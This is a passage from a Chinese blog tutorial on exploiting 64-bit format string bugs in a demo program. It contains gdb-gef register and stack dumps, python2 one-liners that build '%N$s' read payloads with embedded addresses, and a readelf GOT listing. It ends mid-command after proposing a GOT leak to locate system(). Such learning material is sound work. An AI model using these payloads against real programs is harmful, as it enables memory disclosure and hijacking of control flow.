 →  &lt;main+128&gt; mov edi, 0xa</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffdf70  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x1</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdee0  →  <span class="string">&quot;AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x00007fffffffded6  →  <span class="string">&quot;ABCDEFGH&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0x7c</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x00007ffff7fef8c0  →   pxor xmm0, xmm0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x0000000000401090  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffe060  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry parity adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdec8│+0x0000: 0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa ← $rsp</span><br><span class="line">0x00007fffffffded0│+0x0008: 0x4241000000000000</span><br><span class="line">0x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)</span><br><span class="line">0x00007fffffffdee0│+0x0018: &quot;AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p[...]&quot; ← $rdi</span><br><span class="line">0x00007fffffffdee8│+0x0020: &quot;.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%[...]&quot;</span><br><span class="line">0x00007fffffffdef0│+0x0028: &quot;p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.[...]&quot;</span><br><span class="line">0x00007fffffffdef8│+0x0030: &quot;%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;</span><br><span class="line">0x00007fffffffdf00│+0x0038: &quot;.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e17c81 &lt;fprintf+177&gt;    ret    </span><br><span class="line">   0x7ffff7e17c82 &lt;fprintf+178&gt;    call   0x7ffff7ee5a70 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e17c87                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e17c90 &lt;printf+0&gt;       endbr64 </span><br><span class="line">   0x7ffff7e17c94 &lt;printf+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e17c9b &lt;printf+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e17c9e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e17ca3 &lt;printf+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e17ca8 &lt;printf+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;fmtdemo&quot;</span>, stopped 0x7ffff7e17c90 <span class="keyword">in</span> <span class="built_in">printf</span> (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e17c90 → <span class="built_in">printf</span>()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x4011f6 → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>格式字符串的地址在 <code>0x00007fffffffdee0</code>，从下面的输出中可以看到它们在栈中是怎样排布的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/20w $rsp</span><br><span class="line">0x7fffffffdec8:0x4011f60x00x00x42410000</span><br><span class="line">0x7fffffffded8:0x464544430x48470x414141410x41414141</span><br><span class="line">0x7fffffffdee8:0x2e70252e0x252e70250x70252e700x2e70252e</span><br><span class="line">0x7fffffffdef8:0x252e70250x70252e700x2e70252e0x252e7025</span><br><span class="line">0x7fffffffdf08:0x70252e700x2e70252e0x252e70250x70252e70</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">AAAAAAAA.0x1.0x88888888.0xffffffff.0x7fffffffded6.0x7c.0x4241000000000000.0x484746454443.0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x70252e70.0x7fffffffdf57.0x7fffffffdf56.0x40125d.0x7ffff7fa72e8</span><br><span class="line">[Inferior 1 (process 19619) exited with code 012]</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p><code>0x4141414141414141</code> 是输出的第 9 个字符，所以我们使用 <code>%9$s</code> 即可读出 <code>0x4141414141414141</code> 处的内容，当然，这里可能是一个不合法的地址。下面我们把 <code>0x4141414141414141</code> 换成我们需要的合法的地址，比如字符串 <code>ABCDEFGH</code> 的地址 0x7fffffffded6：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">python2 -c <span class="string">&#x27;print(&quot;\xd6\xde\xff\xff\xff\x7f\x00\x00&quot;+&quot;.%9$s&quot;)&#x27;</span> &gt; text</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">gdb-gef fmtdemo</span></span><br><span class="line"></span><br><span class="line">gef➤  b printf</span><br><span class="line">Breakpoint 1 at 0x401070</span><br><span class="line">gef➤  r &lt; text</span><br><span class="line">Starting program: /home/sakura/文档/print/fmtdemo &lt; text</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00007ffff7e17c90 in printf () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000000000401210  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0xffffffff</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x88888888</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdec8  →  0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffdf70  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x1</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdee0  →  0x00007fffffffded6  →  <span class="string">&quot;ABCDEFGH&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x00007fffffffded6  →  <span class="string">&quot;ABCDEFGH&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0x7c</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x00007ffff7fef8c0  →   pxor xmm0, xmm0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x0000000000401090  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffe060  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry parity adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdec8│+0x0000: 0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa ← $rsp</span><br><span class="line">0x00007fffffffded0│+0x0008: 0x4241000000000000</span><br><span class="line">0x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)</span><br><span class="line">0x00007fffffffdee0│+0x0018: 0x00007fffffffded6  →  &quot;ABCDEFGH&quot; ← $rdi</span><br><span class="line">0x00007fffffffdee8│+0x0020: 0x000000732439252e (&quot;.%9$s&quot;?)</span><br><span class="line">0x00007fffffffdef0│+0x0028: 0x0000000000000000</span><br><span class="line">0x00007fffffffdef8│+0x0030: 0x0000000000000000</span><br><span class="line">0x00007fffffffdf00│+0x0038: 0x0000000000000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e17c81 &lt;fprintf+177&gt;    ret    </span><br><span class="line">   0x7ffff7e17c82 &lt;fprintf+178&gt;    call   0x7ffff7ee5a70 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e17c87                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e17c90 &lt;printf+0&gt;       endbr64 </span><br><span class="line">   0x7ffff7e17c94 &lt;printf+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e17c9b &lt;printf+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e17c9e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e17ca3 &lt;printf+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e17ca8 &lt;printf+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;fmtdemo&quot;</span>, stopped 0x7ffff7e17c90 <span class="keyword">in</span> <span class="built_in">printf</span> (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e17c90 → <span class="built_in">printf</span>()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x4011f6 → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  x/20g $rsp</span><br><span class="line">0x7fffffffdec8:0x4011f60x4241000000000000</span><br><span class="line">0x7fffffffded8:0x4847464544430x7fffffffded6</span><br><span class="line">0x7fffffffdee8:0x732439252e0x0</span><br><span class="line">0x7fffffffdef8:0x00x0</span><br><span class="line">0x7fffffffdf08:0x00x400040</span><br><span class="line">0x7fffffffdf18:0xf0b5ff0xc2</span><br><span class="line">0x7fffffffdf28:0x7fffffffdf570x7fffffffdf56</span><br><span class="line">0x7fffffffdf38:0x40125d0x7ffff7fa72e8</span><br><span class="line">0x7fffffffdf48:0x4012100x0</span><br><span class="line">0x7fffffffdf58:0x4010900xffffffffffffe060</span><br><span class="line">gef➤  x/s 0x00007fffffffded6</span><br><span class="line">0x7fffffffded6:&quot;ABCDEFGH&quot;</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">�����</span><br><span class="line">[Inferior 1 (process 21612) exited with code 012]</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>我们看到这里有点问题，本来应该在最后输出.ABCDEFGH字符串的，但是并没有输出。推测是由于最前面的00导致了字符串截断（实验结果说明如下）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\xd8\xde\xff\xff\xff\x7f\x00\x00&quot;+&quot;.%9$p&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemo &lt; text</span><br><span class="line">�����</span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\xd8\xde\xff\xff\xff\x7f\x00\x00&quot;+&quot;.%9$x&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemo &lt; text</span><br><span class="line">�����</span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\xd8\xde\xff\xff\xff\x7f&quot;+&quot;.%9$x&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemo &lt; text</span><br><span class="line">�����.782439</span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\xd8\xde\xff\xff\xff\x7f&quot;+&quot;.%9$p&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemo &lt; text</span><br><span class="line">�����.0x702439</span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\xd8\xde\xff\xff\xff\x7f&quot;+&quot;.%9$s&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemo &lt; text</span><br><span class="line">段错误 (核心已转储)</span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\xd8\xde\xff\xff\xff\x7f&quot;+&quot;.%p&quot;*20)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemo &lt; text</span><br><span class="line">�����.0x1.0x88888888.0xffffffff.0x7fffffffdf36.0x7c.0x4241000000000000.0x484746454443.0x252e7fffffffded8.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x7025.0x7fffffffdfb7.0x7fffffffdfb6.0x40125d.0x7ffff7fa72e8</span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\xd8\xde\xff\xff\xff\x7f\x00\x00&quot;+&quot;.%p&quot;*20)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemo &lt; text</span><br><span class="line">�����</span><br></pre></td></tr></table></figure><p>通过前几次测试，我们发现当地址有\x00时，无论如何变化格式符，结果都一样，这时我就有点怀疑是发生了截断。去掉\x00后再测试，这时就输出了结果，果然是发生了截断。但是这个地址必须要有\x00，该怎么办呢？我看到了下面这篇文章，找到了解决办法 — 把地址放到最后，然后通过测试找出偏移。</p><blockquote><p>参考资料：<a href="https://www.anquanke.com/post/id/194458">64位格式化字符串漏洞修改got表利用详解</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*9+&quot;.%10$p.&quot;+&quot;\xd6\xde\xff\xff\xff\x7f\x00\x00&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemo &lt; text</span><br><span class="line">AAAAAAAAA.0x7fffffffded6.�����</span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*9+&quot;.%10$s.&quot;+&quot;\xd6\xde\xff\xff\xff\x7f\x00\x00&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemo &lt; text</span><br><span class="line">AAAAAAAAA..�����</span><br></pre></td></tr></table></figure><p>这时，我们找到了偏移地址为10，不过我们仍然无法输出字符串，这是怎么回事呢？gdb调试一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ gdb-gef fmtdemo</span><br><span class="line">Reading symbols from fmtdemo...</span><br><span class="line">GEF for linux ready, type `gef&#x27; to start, `gef config&#x27; to configure</span><br><span class="line">88 commands loaded and 5 functions added for GDB 9.1 in 0.01ms using Python engine 3.8</span><br><span class="line">gef➤  b printf</span><br><span class="line">Breakpoint 1 at 0x401070</span><br><span class="line">gef➤  r &lt; text</span><br><span class="line">Starting program: /home/sakura/文档/print/fmtdemo &lt; text</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00007ffff7e17c90 in printf () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000000000401210  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0xffffffff</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x88888888</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdec8  →  0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffdf70  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x1</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdee0  →  0x4141414141414141 (<span class="string">&quot;AAAAAAAA&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x00007fffffffded6  →  <span class="string">&quot;ABCDEFGH&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0x7c</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x00007ffff7fef8c0  →   pxor xmm0, xmm0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x0000000000401090  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffe060  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry parity adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdec8│+0x0000: 0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa ← $rsp</span><br><span class="line">0x00007fffffffded0│+0x0008: 0x4241000000000000</span><br><span class="line">0x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)</span><br><span class="line">0x00007fffffffdee0│+0x0018: 0x4141414141414141 ← $rdi</span><br><span class="line">0x00007fffffffdee8│+0x0020: 0x2e73243031252e41</span><br><span class="line">0x00007fffffffdef0│+0x0028: 0x00007fffffffded6  →  &quot;ABCDEFGH&quot;</span><br><span class="line">0x00007fffffffdef8│+0x0030: 0x0000000000000000</span><br><span class="line">0x00007fffffffdf00│+0x0038: 0x0000000000000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e17c81 &lt;fprintf+177&gt;    ret    </span><br><span class="line">   0x7ffff7e17c82 &lt;fprintf+178&gt;    call   0x7ffff7ee5a70 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e17c87                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e17c90 &lt;printf+0&gt;       endbr64 </span><br><span class="line">   0x7ffff7e17c94 &lt;printf+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e17c9b &lt;printf+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e17c9e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e17ca3 &lt;printf+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e17ca8 &lt;printf+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;fmtdemo&quot;</span>, stopped 0x7ffff7e17c90 <span class="keyword">in</span> <span class="built_in">printf</span> (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e17c90 → <span class="built_in">printf</span>()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x4011f6 → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">AAAAAAAAA.ABCDEFGH.�����</span><br><span class="line">[Inferior 1 (process 22967) exited with code 012]</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>我们发现，调试出来的程序输出了字符串，我推测是关于调试态和运行态的区别吧，奈何我对于linux上的这一块不熟悉。如有大佬了解原因，恳请您答疑。</p><hr><p>当然这也没有什么用，我们真正经常用到的地方是，把程序中某函数的 GOT 地址传进去，然后获得该地址所对应的函数的虚拟地址。然后根据函数在 libc 中的相对位置，计算出我们需要的函数地址（如 <code>system()</code>）。如下面展示的这样：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$  readelf -r fmtdemo</span><br><span class="line"></span><br><span class="line">重定位节 &#x27;.rela.dyn&#x27; at offset 0x4f0 contains 2 entries:</span><br><span class="line">  偏移量          信息           类型           符号值        符号名称 + 加数</span><br><span class="line">000000403ff0  000300000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0</span><br><span class="line">000000403ff8  000400000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0</span><br><span class="line"></span><br><span class="line">重定位节 &#x27;.rela.plt&#x27; at offset 0x520 contains 3 entries:</span><br><span class="line">  偏移量          信息           类型           符号值        符号名称 + 加数</span><br><span class="line">000000404018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 putchar@GLIBC_2.2.5 + 0</span><br><span class="line">000000404020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0</span><br><span class="line">000000404028  000500000007 R_X86_64_JUMP_SLO 0000000000000000 __isoc99_scanf@GLIBC_2.7 + 0</span><br><span class="line">sakura@Kylin:~/文档/print$ </span><br></pre></td></tr></table></figure><p><code>.rel.plt</code> 中有四个函数可供我们选择，按理说选择任意一个都没有问题，但是在实践中我们会发现一些问题。下面的结果分别是 <code>printf</code>、<code>__libc_start_main</code>、<code>putchar</code> 和 <code>__isoc99_scanf</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python2 -c 